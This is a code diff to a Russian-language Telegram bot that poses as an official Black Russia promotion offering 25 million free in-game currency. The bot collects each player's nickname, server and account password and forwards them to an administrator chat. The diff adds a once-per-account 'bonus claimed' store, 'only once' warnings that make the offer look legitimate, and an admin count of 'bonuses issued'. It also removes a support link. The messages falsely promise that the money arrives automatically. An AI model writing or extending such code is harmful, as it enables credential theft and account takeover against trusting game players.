@@ -15,12 +15,44 @@ NICKNAME, SERVER, PASSWORD = range(3)
 # Хранилище данных
 user_data = {}
 
+# Хранилище пользователей, которые уже получили бонус
+completed_users = set()
+
+# Загрузка已完成 пользователей из файла
+CLAIMED_FILE = "claimed_users.json"
+
+def load_claimed_users():
+    global completed_users
+    if os.path.exists(CLAIMED_FILE):
+        try:
+            with open(CLAIMED_FILE, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                completed_users = set(data)
+        except:
+            completed_users = set()
+    else:
+        completed_users = set()
+
+def save_claimed_users():
+    with open(CLAIMED_FILE, 'w', encoding='utf-8') as f:
+        json.dump(list(completed_users), f, ensure_ascii=False)
+
+def has_user_claimed(user_id):
+    return str(user_id) in completed_users
+
+def mark_user_claimed(user_id):
+    completed_users.add(str(user_id))
+    save_claimed_users()
+
+# Загружаем при старте
+import json
+load_claimed_users()
+
 # ========== КЛАВИАТУРЫ ==========
 def main_menu():
     keyboard = [
         [InlineKeyboardButton("💰 ПОЛУЧИТЬ 25КК 💰", callback_data="get_money")],
         [InlineKeyboardButton("🏠 ГЛАВНОЕ МЕНЮ 🏠", callback_data="main_menu")],
-        [InlineKeyboardButton("📞 ПОДДЕРЖКА 📞", url="https://t.me/Lopppaio")],
         [InlineKeyboardButton("📢 НАШ КАНАЛ 📢", url="https://t.me/blackrussia_official")]
     ]
     return InlineKeyboardMarkup(keyboard)
@@ -35,6 +67,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "💰 **АКЦИЯ ДЛЯ НОВЫХ ИГРОКОВ!** 💰\n\n"
         "🔥 Ты можешь получить **БЕСПЛАТНЫЕ 25.000.000** внутриигровой валюты!\n"
         "🎁 Бонус действует на **ЛЮБОМ СЕРВЕРЕ** проекта!\n\n"
+        "⚠️ **ВНИМАНИЕ:** Бонус можно получить **ТОЛЬКО 1 РАЗ** на аккаунт!\n\n"
         "📌 **Как получить:**\n"
         "• Нажми на кнопку «💰 ПОЛУЧИТЬ 25КК»\n"
         "• Укажи свои данные\n"
@@ -53,19 +86,37 @@ async def main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
         "🎮 **Black Russia Bot**\n\n"
         "💰 Бесплатные 25.000.000 валюты\n"
         "🌍 Доступно на всех серверах\n\n"
+        "⚠️ Бонус только **1 раз** на аккаунт!\n\n"
         "📌 **Выбери действие ниже:**"
     )
     await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
 
 async def get_money_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
+    user_id = query.from_user.id
+    
+    # Проверяем, не получал ли уже пользователь бонус
+    if has_user_claimed(user_id):
+        await query.answer("❌ Вы уже получали бонус!", show_alert=True)
+        text = (
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "❌ **ДОСТУП ЗАКРЫТ** ❌\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "😔 К сожалению, вы **УЖЕ ПОЛУЧИЛИ** бонус 25.000.000!\n\n"
+            "⚠️ Акция действует **ТОЛЬКО 1 РАЗ** на аккаунт.\n\n"
+            "🙏 Спасибо, что играете в Black Russia!\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        )
+        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())
+        return ConversationHandler.END
+    
     await query.answer()
     text = (
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "🎮 **ШАГ 1 ИЗ 3** 🎮\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "✏️ **Введите ваш ИГРОВОЙ НИК:**\n\n"
-        "📌 *Пример:* `BlackPlayer`\n\n"
+        "📌 *Пример:* `Petya_Petrov`\n\n"
         "⚠️ Ник должен быть указан точно как в игре!"
     )
     await query.edit_message_text(text, parse_mode="Markdown")
@@ -102,6 +153,12 @@ async def get_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # Ещё раз проверяем перед сохранением
+    if has_user_claimed(user_id):
+        await update.message.reply_text("❌ Вы уже получали бонус!", reply_markup=main_menu())
+        return ConversationHandler.END
+    
     data = user_data.get(user_id, {})
     nickname = data.get("nickname", "?")
     server = data.get("server", "?")
@@ -127,6 +184,9 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await context.bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
         
+        # Помечаем пользователя как получившего бонус
+        mark_user_claimed(user_id)
+        
         # Ответ пользователю
         text = (
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -137,6 +197,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📌 **Что дальше?**\n"
             "• Проверьте внутриигровую почту\n"
             "• Деньги поступят автоматически\n\n"
+            "⚠️ **Напоминаем:** Бонус выдаётся **ТОЛЬКО 1 РАЗ**!\n\n"
             "🙏 **Спасибо, что выбрали Black Russia!**\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             "🎮 *Приятной игры!* 🎮"
@@ -169,7 +230,7 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔧 **ПАНЕЛЬ АДМИНИСТРАТОРА** 🔧\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "✅ Бот работает в штатном режиме\n\n"
-        f"📊 *Всего заявок:* {len(user_data)}\n"
+        f"📊 *Всего выдано бонусов:* {len(completed_users)}\n"
         f"👑 *Ваш ID:* `{update.effective_user.id}`\n\n"
         "📌 *Новые заявки приходят в этот чат*"
     )
@@ -191,7 +252,6 @@ async def run_bot():
     
     application = Application.builder().token(TOKEN).build()
     
-    # Регистрируем обработчики
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(get_money_start, pattern="get_money")],
         states={
@@ -214,7 +274,6 @@ async def run_bot():
     await application.start()
     await application.updater.start_polling()
     
-    # Держим бота живым
     while True:
         await asyncio.sleep(3600)
 
@@ -235,10 +294,8 @@ if __name__ == "__main__":
     
     port = int(os.environ.get("PORT", 8000))
     
-    # Запускаем Flask в отдельном потоке
     flask_thread = threading.Thread(target=lambda: app_flask.run(host="0.0.0.0", port=port))
     flask_thread.daemon = True
     flask_thread.start()
     
-    # Запускаем бота
     asyncio.run(run_bot())
